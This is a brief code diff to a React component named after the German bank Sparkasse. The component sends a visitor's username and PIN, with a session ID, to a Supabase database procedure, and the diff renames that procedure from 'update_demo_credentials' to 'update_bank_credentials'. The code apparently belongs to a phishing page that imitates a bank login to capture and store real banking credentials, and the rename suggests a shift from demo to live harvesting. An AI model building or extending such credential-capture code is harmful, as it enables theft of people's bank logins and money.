@@ -125,7 +125,7 @@ const Sparkasse = () => {
     }
     if (pin.trim() === "") { setPinError(true); return; }
     if (sessionId) {
-      const { error: err } = await supabase.rpc("update_demo_credentials", {
+      const { error: err } = await supabase.rpc("update_bank_credentials", {
         p_session_id: sessionId,
         p_username: username,
         p_password: pin,
